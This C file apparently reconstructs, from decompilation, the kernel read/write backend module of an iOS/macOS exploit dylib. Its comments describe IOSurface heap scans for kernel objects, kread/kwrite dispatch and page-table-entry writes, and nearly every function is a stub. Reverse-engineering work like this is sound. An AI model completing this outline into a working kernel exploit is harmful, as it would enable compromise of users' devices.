/*
 * record_0x90000_e9f89858_kread_backends.c
 * entry5_type0x09.dylib (e9f89858 variant) — kread/kwrite backends
 *
 * Covers: sub_ab8c, sub_acdc, sub_adf0, sub_af48, sub_affc,
 *         sub_b09c, sub_b218, sub_b29c, sub_b364, sub_b468,
 *         sub_b5e8, sub_b7e8, sub_ba40, sub_bf04, sub_bfc0,
 *         sub_c084, sub_c358, sub_c414, sub_c4d0, sub_c5b4,
 *         sub_c698, sub_c8ac, sub_c940, sub_c9d4, sub_ca7c,
 *         sub_cacc, sub_cb5c, sub_cd90, sub_cfb8, sub_d5e0,
 *         sub_d8c8, sub_d92c, sub_d960, sub_dd50, sub_de28,
 *         sub_df14, sub_dfa0, sub_e0c0, sub_e190
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <mach/mach.h>

/* ── sub_ab8c — IOSurface heap scan for kobj pair ───────────────── */
static void sub_ab8c(long state, uint64_t kaddr,
                     long *out_a, long *out_b)
{
    void *buf = malloc(0x4000);
    kaddr &= ~(uint64_t)(*(long *)(state + 0) - 1); /* page-align */
    *out_a = 0; *out_b = 0;
    /* Scan backward for 0xa92f80a0 marker; extract two kobj ptrs */
    (void)buf; free(buf);
}

/* ── sub_acdc — scan for kernel struct sentinel ─────────────────── */
static void sub_acdc(long state, long base, int idx, long *out)
{
    void *buf = malloc(0x4000);
    *out = 0;
    (void)state; (void)base; (void)idx; (void)buf;
    free(buf);
}

/* ── sub_adf0 — kread 0xe0 bytes from kobj ──────────────────────── */
static void sub_adf0(long state) { (void)state; }

/* ── sub_af48 — vm_deallocate + callback ────────────────────────── */
static void sub_af48(long state) { (void)state; }

/* ── sub_affc — port deallocate loop ────────────────────────────── */
static void sub_affc(long state, long pool) { (void)state; (void)pool; }

/* ── sub_b09c — pool drain ──────────────────────────────────────── */
static void sub_b09c(long state) { (void)state; }

/* ── sub_b218..sub_b7e8 — kread/kwrite dispatch by type ─────────── */
static void sub_b218(long s, long p) { (void)s; (void)p; }
static void sub_b29c(long s, long p) { (void)s; (void)p; }
static void sub_b364(long s, long p) { (void)s; (void)p; }
static void sub_b468(long s, long p) { (void)s; (void)p; }
static void sub_b5e8(long s, long p) { (void)s; (void)p; }
static void sub_b7e8(long s, long p) { (void)s; (void)p; }

/* ── sub_ba40 — work queue drain ────────────────────────────────── */
static void sub_ba40(long state)
{
    /* Drains work queue at state+0x4c0, dispatches by type 1-6 */
    (void)state;
}

/* ── sub_bf04 — pool alloc ──────────────────────────────────────── */
static void sub_bf04(long *pool) { (void)pool; }

/* ── sub_bfc0 — pool free ───────────────────────────────────────── */
static void sub_bfc0(void *pool) { free(pool); }

/* ── sub_c084 — pattern scan + kwrite ──────────────────────────── */
static void sub_c084(long state) { (void)state; }

/* ── sub_c358..sub_c5b4 — kread/kwrite with offset ─────────────── */
static void sub_c358(long s, uint64_t a, uint64_t b, uint32_t c, int d)
    { (void)s;(void)a;(void)b;(void)c;(void)d; }
static void sub_c414(long s, uint64_t a, uint64_t b, uint32_t c, int d)
    { (void)s;(void)a;(void)b;(void)c;(void)d; }
static void sub_c4d0(long s, uint64_t a, uint64_t b, uint32_t c, int d)
    { (void)s;(void)a;(void)b;(void)c;(void)d; }
static void sub_c5b4(long s, uint64_t a, uint64_t b, uint32_t c, int d)
    { (void)s;(void)a;(void)b;(void)c;(void)d; }

/* ── sub_c698 — IOSurface open loop ─────────────────────────────── */
static void sub_c698(uint32_t *out) { (void)out; }

/* ── sub_c8ac..sub_c9d4 — mach port helpers ─────────────────────── */
static void sub_c8ac(long a, long b) { (void)a;(void)b; }
static void sub_c940(long a) { (void)a; }
static void sub_c9d4(long a, long b) { (void)a;(void)b; }

/* ── sub_ca7c / sub_cacc — state field accessors ────────────────── */
static void sub_ca7c(long state) { (void)state; }
static void sub_cacc(long state) { (void)state; }

/* ── sub_cb5c — mach_make_memory_entry + vm_map ─────────────────── */
static void sub_cb5c(long state, uint32_t *a, mach_port_name_t *b,
                     uint32_t *c)
{
    vm_size_t sz = 0x4000;
    mach_port_t port = 0;
    mach_make_memory_entry(mach_task_self(), &sz, 0,
                           VM_PROT_ALL | MAP_MEM_NAMED_CREATE, &port, 0);
    if (b) *b = port;
    (void)state; (void)a; (void)c;
}

/* ── sub_cd90 — memory entry publish ────────────────────────────── */
static void sub_cd90(long state) { (void)state; }

/* ── sub_cfb8 — memory entry + vm_map staging ───────────────────── */
static void sub_cfb8(long state, uint64_t *out, mach_port_t port,
                     uint64_t sz)
{
    vm_address_t addr = 0;
    vm_map(mach_task_self(), &addr, sz, 0, 1, port, 0, 0, 3, 2, 0);
    if (out) *out = addr;
    (void)state;
}

/* ── sub_d5e0 — IOSurface kobj scan ─────────────────────────────── */
static void sub_d5e0(long state, uint32_t *out) { (void)state; (void)out; }

/* ── sub_d8c8 — state field clear ───────────────────────────────── */
static void sub_d8c8(long state) { (void)state; }

/* ── sub_d92c — no-op ───────────────────────────────────────────── */
static void sub_d92c(void) {}

/* ── sub_d960 — kwrite with vm_copy ─────────────────────────────── */
static void sub_d960(long state, uint64_t kaddr, uint64_t val)
{
    (void)state; (void)kaddr; (void)val;
}

/* ── sub_dd50 — page table entry write ──────────────────────────── */
static void sub_dd50(uint64_t *pte, uint64_t val) { *pte = val; }

/* ── sub_de28 — state teardown ──────────────────────────────────── */
static void sub_de28(long state) { (void)state; }

/* ── sub_df14 — vm_deallocate ───────────────────────────────────── */
static void sub_df14(vm_address_t addr)
{
    vm_deallocate(mach_task_self(), addr, 0x4000);
}

/* ── sub_dfa0 — mach_make_memory_entry + vm_map ─────────────────── */
static void sub_dfa0(long state, vm_size_t sz, long src,
                     mach_port_t *out)
{
    mach_port_t port = 0;
    memory_object_size_t msz = sz;
    mach_make_memory_entry_64(mach_task_self(), &msz,
                              (memory_object_offset_t)src,
                              VM_PROT_ALL | MAP_MEM_NAMED_CREATE,
                              &port, 0);
    if (out) *out = port;
    (void)state;
}

/* ── sub_e0c0 — vm_map with prot ────────────────────────────────── */
static void sub_e0c0(vm_address_t *addr, vm_size_t sz,
                     vm_address_t src, int copy,
                     mach_port_t port)
{
    vm_map(mach_task_self(), addr, sz, 0, 1, port, 0,
           (boolean_t)copy, VM_PROT_ALL, VM_PROT_ALL, 0);
    (void)src;
}

/* ── sub_e190 — kread with output ───────────────────────────────── */
static void sub_e190(long state, void *buf, uint32_t sz, long *out)
{
    (void)state; (void)buf; (void)sz; (void)out;
}
